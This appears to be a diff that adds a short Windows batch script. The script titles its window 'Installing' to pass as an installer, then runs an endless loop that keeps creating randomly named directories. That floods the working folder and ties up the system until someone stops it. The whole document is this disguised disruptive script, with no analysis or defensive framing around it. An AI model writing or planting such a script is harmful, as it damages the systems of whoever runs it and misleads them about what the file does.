@@ -1,0 +1,6 @@
+@echo off
+chcp 65001
+title Installing
+:top
+Md %random%
+Goto top
